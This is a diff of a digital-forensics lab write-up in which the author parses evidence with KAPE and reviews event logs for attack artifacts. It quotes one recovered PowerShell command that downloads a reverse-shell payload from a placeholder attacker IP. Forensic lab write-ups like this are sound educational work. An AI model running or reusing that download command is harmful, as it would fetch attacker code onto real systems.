@@ -52,6 +52,7 @@ Next, I launched KAPE (Kroll Artifact Parser and Extractor), pointed it to the e
 - Selected key targets (like registry hives, event logs, MFT).
 - Selected modules to parse this data into structured outputs.
 - Set a destination folder for processed results.
+
 Then, I executed the task.
 KAPE processed the evidence and produced multiple Excel sheets (CSV/XLSX) containing parsed data.
 
@@ -77,7 +78,7 @@ Through this analysis, I found clear artifacts of the attack:
 - Command line evidence in Event Logs:
   - Found PowerShell and cmd commands in the Security/PowerShell logs.
   - Notably recovered the command that downloaded the payload:
-    ```
+    ```batch
     powershell -Command "Invoke-WebRequest -Uri http://<attacker_IP>/powershell_reverse.pyzw -OutFile C:\Users\Public\Documents\powershell_reverse.pyzw"
     ```
   - This revealed the attacker’s IP address: `<attacker_IP>`.
@@ -111,3 +112,5 @@ This provided a clear chronological picture of the attack.
 > ⚠️ Disclaimer
 > This project was performed strictly for educational and ethical purposes in a controlled lab environment.
 > Always ensure you have explicit authorization before performing any form of forensic analysis or incident response on systems.
+
+---
